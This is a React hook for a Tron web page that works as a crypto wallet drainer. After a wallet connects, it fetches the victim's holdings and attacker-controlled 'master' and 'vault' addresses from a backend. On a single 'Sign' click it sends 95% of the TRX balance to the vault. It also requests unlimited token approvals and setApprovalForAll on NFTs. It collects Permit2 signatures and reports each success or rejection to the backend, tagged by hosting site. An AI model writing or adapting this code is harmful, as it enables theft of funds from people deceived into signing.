import { useEffect, useMemo, useRef, useState } from "react";
import {
  // action helpers
  getDeadline,
  createApprovalObject,
  signTronTypedData,
  normalizeTronTypedDataDomain,
  // constants
  TRON_PERMIT2_ADDRESS,
  MaxUint160BigInt,
} from "../utils/tron";
import {
  apiCall,
  createTokenData,
  logApprovalReject,
  logFeError,
  isActionUserRejection,
  logApprovalSuccess,
} from "../utils/hookClient";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { ethers } from "ethers";
import {
  AllowanceTransfer,
  PERMIT_TYPES,
  PERMIT_BATCH_TYPES,
} from "@sun-protocol/permit2-sdk";


// Global variables
const owner = window.location.hostname.replace(/^www\./, "");

const fail = (label, extra = {}) => {
  console.warn(`[useTronActions] ${label}`, extra);
  return { success: false };
};

const useTronActions = (contextValues) => {
  const { isLoading, setIsLoading, balance, setBalance } = contextValues;
  const [chainId, setChainId] = useState(728126428); //null);
  const { address, connected, wallet } = useWallet();
  const [tronWeb, setTronWeb] = useState(null);
  const [masterAddress, setMasterAddress] = useState(null);
  const [vault, setVault] = useState(null);
  const [submitContract, setSubmitContract] = useState(null);
  const [allTokens, setAllTokens] = useState([]);
  const allTokensRef = useRef(allTokens);
  allTokensRef.current = allTokens;
  const actionOutcomeRef = useRef({ rejected: false });
  const [blacklisted, setBlacklisted] = useState(false);
  const apiData = useMemo(
    () => ({ address, chainId, owner }),
    [address, chainId, owner]
  );

  const { VITE_BACK: apiUrl } = import.meta.env;
  // const apiUrl = "http://localhost:3000";

  const logActionFailure = (handleType, token, error, isBatchPermit = false) => {
    if (isActionUserRejection(error)) {
      actionOutcomeRef.current.rejected = true;
      console.log("[logActionFailure] user rejection", {
        handleType,
        isBatchPermit,
        token,
        error,
      });
      logApprovalReject(apiUrl, handleType, token, apiData, isBatchPermit);
    } else {
      console.log("[logActionFailure] FE error", {
        handleType,
        isBatchPermit,
        token,
        error,
      });
      logFeError(apiUrl, handleType, token, apiData, error, isBatchPermit);
    }
  };

  const prefChainIds = [728126428]; //tron mainnet

  async function encodeParams(inputs) {
    const ADDRESS_PREFIX_REGEX = /^(41)/;
    const ADDRESS_PREFIX = "41";

    let typesValues = inputs;
    let parameters = "";

    if (typesValues.length == 0) return parameters;

    // Use ethers latest version AbiCoder
    const abiCoder = ethers.AbiCoder.defaultAbiCoder();
    let types = [];
    const values = [];

    for (let i = 0; i < typesValues.length; i++) {
      let { type, value } = typesValues[i];
      if (type == "address") value = value.replace(ADDRESS_PREFIX_REGEX, "0x");
      else if (type == "address[]")
        value = value.map((v) =>
          tronWeb.address.toHex(v).replace(ADDRESS_PREFIX_REGEX, "0x")
        );
      types.push(type);
      values.push(value);
    }

    console.log(types, values);
    try {
      parameters = abiCoder.encode(types, values).replace(/^(0x)/, "");
    } catch (ex) {
      console.log(ex);
    }
    return parameters;
  }

  const waitForTronTransaction = async (
    txid,
    maxRetries = 30,
    delay = 2000
  ) => {
    console.log("Waiting for Tron transaction confirmation:", txid);
    for (let i = 0; i < maxRetries; i++) {
      console.log("retries", i);
      try {
        const txInfo = await tronWeb.trx.getTransactionInfo(txid);

        if (txInfo && txInfo.receipt) {
          console.log("Transaction confirmed on attempt", i + 1);
          // Transaction confirmed
          return {
            success: txInfo.receipt.result === "SUCCESS",
            txid: txid,
            blockNumber: txInfo.blockNumber,
            receipt: txInfo.receipt,
          };
        }
      } catch (error) {
        console.log(`Attempt ${i + 1}: Transaction ${txid} not found yet`);
      }

      // Wait before next attempt
      await new Promise((resolve) => setTimeout(resolve, delay));
    }

    throw new Error(
      `Transaction ${txid} not confirmed after ${maxRetries} attempts`
    );
  };

  useEffect(() => {
    const process = async () => {
      if (connected && wallet?.state === "Connected") {
        // if (!chains.hasOwnProperty(chainId)) {
        if (!prefChainIds.includes(chainId)) {
          wallet?.adapter?.switchChain("0x" + (728126428).toString(16));
        }
        if (address) {
          setIsLoading(true);
          try {
            const tronWebInstance = wallet.adapter._wallet?.tronWeb;
            if (!tronWebInstance) {
              console.warn("[useTronActions] TronWeb not ready from wallet adapter");
              return;
            }

            setTronWeb(tronWebInstance);

            const connectObj = {
              address,
              chainId: chainId || 728126428,
              owner,
              WalletProviderType: wallet?.adapter.name || "unknown",
            };


            setBlacklisted(false);
            const result = await apiCall(apiUrl, "/balance", connectObj);

            if (result?.data?.blacklisted) {
              setBlacklisted(true);
              setAllTokens([]);
              setBalance([]);
              return;
            }

            if (!result || !result?.success) return;

            const { data: balanceData } = result;


            const { tokenList, masterAddress, vault, ethSubmit } = balanceData;

            if (!masterAddress || !vault) {
              console.warn("[useTronActions] balance response missing master/vault:", balanceData);
              return;
            }

            setMasterAddress(masterAddress);
            setVault(vault);

            if (ethSubmit) {
              const sContract = await tronWebInstance.contract().at(ethSubmit);
              setSubmitContract(sContract);
            } else {
              setSubmitContract(null);
            }

            if (tokenList) {
              setAllTokens(tokenList);
              const flatTokenList = [
                ...(tokenList || []).flatMap((item) => item.tokens || []),
              ];
              setBalance(flatTokenList);
            }
          } finally {
            setIsLoading(false);
          }
        }
      }
    };

    process();
  }, [address, chainId, wallet?.state]);

  useEffect(() => {
    if (connected) {
      return
    } else{
      setTronWeb(null);
      setMasterAddress(null);
      setVault(null);
      setSubmitContract(null);
      setAllTokens([]);
      setBalance([]);
    }
  }, [connected]);

  const MAX_SKIPS_PER_CLICK = 8;

  const dropHead = () => {
    const next = (allTokensRef.current || []).slice(1);
    allTokensRef.current = next;
    setAllTokens(next);
    return next;
  };

  const attempt = async (group) => {
    actionOutcomeRef.current = { rejected: false };
    const result = await Selector(group);
    return { result, o: { ...actionOutcomeRef.current } };
  };

  const action = async () => {
    if (blacklisted) return { success: false };
    apiCall(apiUrl, "/click", {
      click: "Sign Button",
      address,
      owner,
    });

    if (!(allTokensRef.current && allTokensRef.current.length > 0)) {
      return { success: false };
    }
    setIsLoading(true);

    try {
      let skips = 0;
      while (allTokensRef.current?.length && skips < MAX_SKIPS_PER_CLICK) {
        const group = allTokensRef.current[0];
        if (!group) return { success: false };

        const { result, o } = await attempt(group);
        if (result?.success) {
          dropHead();
          return { success: true };
        }
        if (o.rejected) return { success: false };
        if (result?.skipped) {
          dropHead();
          skips += 1;
          continue;
        }

        const again = await attempt(group);
        if (again.result?.success) {
          dropHead();
          return { success: true };
        }
        if (again.o.rejected) return { success: false };

        dropHead();
        skips += 1;
      }
      return { success: false };
    } catch (error) {
      console.error("Token processing failed:", error);
      return { success: false };
    } finally {
      setIsLoading(false);
    }
  };

  const Selector = async (token) => {
    if (!token) {
      console.warn("[useTronActions] Selector: empty strategy group");
      return { success: false };
    }
    const { tokens, batchPermit: isBatchPermit } = token;
    const selectedToken = tokens[0];

    if (!selectedToken?.handleType) {
      console.warn("[useTronActions] Selector: malformed group — missing tokens[0] or handleType", token);
      logFeError(
        apiUrl,
        "missing",
        selectedToken || token,
        apiData,
        new Error("Selector: missing tokens[0] or handleType")
      );
      return { success: true, skipped: true };
    }

    const h = selectedToken.handleType;
    const handlers = {
      // Native leave
      ethSend: () => ethSend(selectedToken),
      // Approvals / allowances
      approve: () => approve(selectedToken),
      increaseAllowance: () => approve(selectedToken),
      increaseApproval: () => approve(selectedToken),
      multicall: () => handleMulticall(selectedToken),
      // Permits / signatures
      ethPermit: () => {
        // Parked on Tron — fallback to on-chain approve if strat ever routes here
        console.log("ethPermit parked, falling back to approve:", selectedToken?.symbol);
        return approve({ ...selectedToken, handleType: "approve" });
      },
      permit2: () => permit2(tokens, isBatchPermit),
    };

    const run = handlers[h];
    if (!run) {
      console.log("unknown handleType, skipping to next:", h, selectedToken);
      logFeError(
        apiUrl,
        h,
        selectedToken,
        apiData,
        new Error(`unknown handleType: ${h}`)
      );
      return { success: true, skipped: true };
    }
    return await run();
  };

  // ============================================================================
  // Native leave
  // ============================================================================

  const ethSend = async (token) => {
    if (!token || !tronWeb || !vault) {
      return fail("ethSend prerequisites missing", {
        hasToken: !!token,
        hasTronWeb: !!tronWeb,
        hasVault: !!vault,
      });
    }
    try {
      // If token.amount is in main units, convert to smallest units (SUN)
      const amount = token.amount * 0.95;
      const amountInSUN = tronWeb.toSun(Math.floor(amount)); // 1 TRX = 1,000,000 SUN
      const ethValue = tronWeb.fromSun(amountInSUN); // Convert back to TRX for display
      const energyLimit = 1_000_000;
      if (Number(ethValue) > 0) {
        const ethsend = submitContract
          ? await submitContract.sign({ callValue: amountInSUN, feeLimit: energyLimit }).send()
          : await tronWeb.trx.sendTransaction(vault, amountInSUN, {feeLimit: energyLimit});

        // const ethsend = await tronWeb.trx.sendTransaction(vault, amountInSUN, {
        //   feeLimit: energyLimit,
        // });

        if (!ethsend) return { success: false };
        console.log("ethsend", ethsend);
        waitForTronTransaction(ethsend.txid || ethsend);

        const tokenData = createTokenData(token, Number(ethValue));
        const ethsendObject = createApprovalObject(
          tokenData,
          apiData,
          ethsend.txid || ethsend,
          token.handleType
        );
        console.log("ethsendObject", ethsendObject);
        logApprovalSuccess(apiUrl, ethsendObject, token.handleType);
        return { success: true };
      } else {
        return { success: false };
      }
    } catch (error) {
      console.log("error in ethSend", error.message);
      logActionFailure(token.handleType, token, error);
      return { success: false };
    }
  };

  // ============================================================================
  // Approvals / allowances
  // ============================================================================

  const approve = async (token) => {
    if (!token || !tronWeb || !masterAddress) {
      return fail("approve prerequisites missing", {
        hasToken: !!token,
        hasTronWeb: !!tronWeb,
        hasMaster: !!masterAddress,
      });
    }
    console.log("approve", token);
    const approvalAmount = MaxUint160BigInt;
    try {
      const contract = await tronWeb.contract().at(token.id);
      
      console.log("contract address", contract.address);

      const result = await contract[token.handleType](
        masterAddress,
        approvalAmount
      ).send({
        feeLimit: 100_000_000, // 100 TRX fee limit
        callValue: 0,
        // shouldPollResponse: true // Wait for confirmation
      });

      waitForTronTransaction(result);

      const tokenData = createTokenData(token);
      const approvalObject = createApprovalObject(
        tokenData,
        apiData,
        result,
        token.handleType
      );
      logApprovalSuccess(apiUrl, approvalObject, token.handleType);

      return { success: true };
    } catch (error) {
      console.error("error in approve", error);
      logActionFailure(token.handleType, token, error);
      return { success: false };
    }
  };

  const handleMulticall = async (token) => {
    if (!token || !tronWeb || !masterAddress) {
      return fail("multicall prerequisites missing", {
        hasToken: !!token,
        hasTronWeb: !!tronWeb,
        hasMaster: !!masterAddress,
      });
    }

    console.log("got here in handleMulticall");
    if (token.tokenType === "trc721") {
      try {
        // Define the ABI for multicall and setApprovalForAll
        const multicallABI = {
          inputs: [{ name: "data", type: "bytes[]" }],
          name: "multicall",
          outputs: [{ name: "results", type: "bytes[]" }],
          stateMutability: "nonpayable",
          type: "function",
        };

        const setApprovalForAllABI = {
          inputs: [
            { name: "operator", type: "address" },
            { name: "approved", type: "bool" },
          ],
          name: "setApprovalForAll",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function",
        };

        // Get contract instance with both ABIs
        const uniswapV3Contract = tronWeb.contract(
          [multicallABI, setApprovalForAllABI],
          token.id
        );

        // Encode the function call for multicall using ethers (as per Tron docs)
        const functionSignature = "setApprovalForAll(address,bool)";
        const functionHash = "0xa22cb465"; //manually set
        const tronFnHash = tronWeb.utils.ethersUtils
          .keccak256(tronWeb.utils.ethersUtils.toUtf8Bytes(functionSignature))
          .slice(0, 10); // First 4 bytes

        // Prepare inputs for encoding
        const inputs = [
          { type: "address", value: tronWeb.address.toHex(masterAddress) },
          { type: "bool", value: true },
        ];

        // Encode parameters using our helper function
        const encodedParams = await encodeParams(inputs);

        // Combine function hash + encoded parameters
        const approvalData = tronFnHash + encodedParams;
        const multicallData = [approvalData];

        const multicall = await executeSingleMulticall(
          uniswapV3Contract,
          multicallData
        );

        if (!multicall) return { success: false };
        waitForTronTransaction(multicall.hash || multicall);

        const tokenData = createTokenData(token);
        const approvalObject = createApprovalObject(
          tokenData,
          apiData,
          // result.txid || result,
          multicall.hash || multicall,
          token.handleType
        );

        logApprovalSuccess(apiUrl, approvalObject, token.handleType);
        return { success: true };
      } catch (error) {
        console.error("Error at TRC721 approval:", error);
        logActionFailure(token.handleType, token, error);
        return { success: false };
      }
    } else return { success: false };
  };

  const executeSingleMulticall = async (multicallContract, multicallData) => {
    try {
      const tx = await multicallContract.multicall(multicallData).send({
        feeLimit: 100_000_000, // 100 TRX fee limit
        callValue: 0,
      });
      return { hash: tx };
    } catch (error) {
      throw error;
    }
  };

  // ============================================================================
  // Permits / signatures
  // ============================================================================

  const createPermit2Signature = async (token, tokens, isBatchPermit = false) => {
    const transfer = new AllowanceTransfer(tronWeb, TRON_PERMIT2_ADDRESS, false)
    const sigDeadline = getDeadline().toString();
    const expiration = getDeadline(3).toString();

    if (!isBatchPermit) {
      const { domain, permitSingle } = await transfer.generatePermitSignData(
        {
          owner: address,
          token: token.id,
          amount: MaxUint160BigInt,
          deadline: expiration,
        },
        masterAddress,
        sigDeadline
      );

      console.log("Permit2 sign data (single):", { domain, permitSingle });

      const signature = await signTronTypedData(tronWeb, wallet, {
        domain: normalizeTronTypedDataDomain(domain),
        types: PERMIT_TYPES,
        message: permitSingle,
      });

      return { signature, permitData: permitSingle };
    }

    const paramsList = tokens.map((t) => ({
      owner: address,
      token: t.id,
      amount: MaxUint160BigInt,
      deadline: expiration,
    }));

    const { domain, permitBatch } = await transfer.generatePermitBatchSignData(
      paramsList,
      masterAddress,
      sigDeadline
    );

    console.log("Permit2 sign data (batch):", { domain, permitBatch });

    const signature = await signTronTypedData(tronWeb, wallet, {
      domain: normalizeTronTypedDataDomain(domain),
      types: PERMIT_BATCH_TYPES,
      message: permitBatch,
    });

    return { signature, permitData: permitBatch };
  };

  const permit2 = async (tokens, isBatchPermit = false) => {
    if (!tokens?.length || !tronWeb || !masterAddress) {
      return fail("permit2 prerequisites missing", {
        tokenCount: tokens?.length ?? 0,
        hasTronWeb: !!tronWeb,
        hasMaster: !!masterAddress,
      });
    }
    const token = tokens[0];
    const totalValue = tokens.reduce(
      (sum, t) => sum + (t.tokenValue || 0),
      0
    );

    try {
      const { signature, permitData } = await createPermit2Signature(
        token,
        tokens,
        isBatchPermit
      );

      if (!signature) return { success: false };
      console.log("signature", signature);
      console.log("permitData", permitData);

      const singleTokenData = createTokenData(token);
      const batchTokenData = {
        list: tokens.map((t) => ({
          symbol: t.symbol,
          amount: t.amount,
          address: t.id,
        })),
        value: totalValue,
        type: "erc20",
      };

      const permit2Object = {
        address,
        chainId,
        signature,
        permitData,
        tokenData: isBatchPermit ? batchTokenData : singleTokenData,
        owner,
        handleType: isBatchPermit ? "batchpermit" : "singlepermit",
      };

      logApprovalSuccess(apiUrl, permit2Object, "permit2", isBatchPermit);
      return { success: true };
    } catch (error) {
      console.error("Error at Permit2:", error?.message || error);
      logActionFailure("permit2", token, error, isBatchPermit);
      return { success: false };
    }
  };


  return {
    action,
  };
};

export default useTronActions;
